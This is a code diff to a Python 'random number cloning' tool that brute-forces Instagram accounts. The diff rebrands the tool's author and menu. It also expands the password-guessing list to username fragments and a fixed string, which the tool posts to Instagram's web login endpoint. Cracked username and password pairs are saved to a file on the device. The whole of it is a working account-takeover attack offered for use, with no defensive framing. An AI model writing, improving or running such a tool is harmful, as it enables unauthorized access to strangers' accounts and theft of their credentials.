@@ -29,7 +29,7 @@ idz = []
 oks = []
 cps = []
  
-sys.stdout.write('\x1b[1;35m\x1b]2;🌹🌻🍂💛YounisXyz 🙂💗 \x07')
+sys.stdout.write('\x1b[1;35m\x1b]2;🌹🌻🍂💛instagram 🙂💗 \x07')
  
 try:os.mkdir('/sdcard/XYZ')
 except:pass
@@ -47,10 +47,7 @@ logo= f'''\033[1;97m
      d88P   Y88b     888     d8888888888 
      
 \033[1;97m---------------------------------------------------
- \033[1;97m[\033[1;92m•\033[1;97m] Author   : Muhammad Younis
- \033[1;97m[\033[1;92m•\033[1;97m] Facebook : https://facebook.com/xyzhackers
- \033[1;97m[\033[1;92m•\033[1;97m] GitHub   : https://github.com/YounisXyz
- \033[1;97m[\033[1;92m•\033[1;97m] Version  : \033[1;92m0.1
+ \033[1;97m[\033[1;92m•\033[1;97m] Author   : sumon roy
 \033[1;97m---------------------------------------------------
 '''
  
@@ -72,18 +69,15 @@ def linex():
 def menu():
     clear()
     print(f" \033[1;97m[\033[1;92m01\033[1;97m] RANDOM NUMBER CLONING")
-    print(f" \033[1;97m[\033[1;92m02\033[1;97m] \x1b[38;5;208mVISIT YOUTUBE CHANNEL")
-    print(f" \033[1;97m[\033[1;92m03\033[1;97m] \033[1;32mCONTACT DEVELOPER")
+    print(f" \033[1;97m[\033[1;92m02\033[1;97m] \033[1;32mCONTACT DEVELOPER")
     linex()
     younisxyz = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option : ")
     if younisxyz in ['1','01']:
         random_number()
     elif younisxyz in ['2','02']:
-        os.system("xdg-open https://youtube.com/@MRTRICKERXYZ?si=OSGhb7VAn8a_QX1C")
+        os.system("xdg-open ")
         time.sleep(3)
         menu()
-    elif younisxyz in ['3','03']:
-    	os.system("xdg-open https://www.facebook.com/xyzhackers");time.sleep(3);menu()
     else:
         print(f"\n\033[1;91m Select valid option ....")
         time.sleep(3)
@@ -116,7 +110,7 @@ def random_number():
         linex()
         for xyz in idz:
             uid = code+xyz
-            pww = [xyz,uid] 
+            pww = [uid[:6],uid[:8],uid,uid[2:],uid[4:],'57273200'] 
             XYZ.submit(crack, uid, pww, total_idz)
     linex()
     print(f" \033[1;97m[\033[1;92m!\033[1;97m] Process Completed ")
@@ -133,7 +127,7 @@ def crack(uid, pww, total_idz):
     global oks
     global cps
     x = random.choice(["\033[1;90m","\033[1;91m","\033[1;92m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
-    sys.stdout.write(f"\r{x}[YounisXyz] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
+    sys.stdout.write(f"\r{x}[BITHIKA] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
     sys.stdout.flush()
     try:
         for pw in pww:
@@ -181,7 +175,7 @@ def crack(uid, pww, total_idz):
             login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
             response = requests.post(login_url, params=params, cookies=cookies, headers=headers, data=data)
             if response.status_code == 200 and response.json().get("authenticated"):
-                print(f"\r\033[1;92m [XYZ-OK] {uid} | {pw}")
+                print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
                 open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
